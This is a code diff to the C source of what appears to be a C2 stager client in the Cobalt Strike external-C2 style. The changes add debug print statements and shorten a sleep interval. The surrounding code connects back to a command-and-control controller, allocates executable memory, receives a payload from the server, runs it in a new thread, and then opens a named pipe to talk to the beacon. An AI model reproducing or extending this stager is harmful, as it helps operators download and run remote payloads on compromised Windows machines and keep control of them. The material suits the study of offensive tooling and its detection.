@@ -246,7 +246,7 @@ void main(int argc, char* argv[])
 
 	// Create a connection back to our C2 controller
 	SOCKET sockfd = INVALID_SOCKET;
-
+	printf("Creating socket");
 	sockfd = create_socket(IP, PORT);
 	if (sockfd == INVALID_SOCKET)
 	{
@@ -255,12 +255,15 @@ void main(int argc, char* argv[])
 	}
 
 	// Allocate data for receiving beacon payload
+	printf("running Virutal Alloc");
 	char * payload = VirtualAlloc(0, PAYLOAD_MAX_SIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 	if (payload == NULL)
 	{
 		printf("payload buffer malloc failed!\n");
 		exit(1);
 	}
+
+	printf("Recieving initial payload data");
 	DWORD payload_size = recvData(sockfd, payload, BUFFER_MAX_SIZE);
 	if (payload_size < 0)
 	{
@@ -270,11 +273,13 @@ void main(int argc, char* argv[])
 	}
 	printf("Recv %d byte payload from TS\n", payload_size);
 	/* inject the payload stage into the current process */
+
+	printf("Injecting payload stage into current process.");
 	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)payload, (LPVOID) NULL, 0, NULL);
 	// Loop unstil the pipe is up and ready to use
 	while (beaconPipe == INVALID_HANDLE_VALUE) {
 		// Create our IPC pipe for talking to the C2 beacon
-		Sleep(500);
+		Sleep(5);
 		// 50 (max size of PIPE_STR) + 13 (size of "\\\\.\\pipe\\")
 		char pipestr[50+13]= "\\\\.\\pipe\\";
 		// Pipe str (i.e. "mIRC")
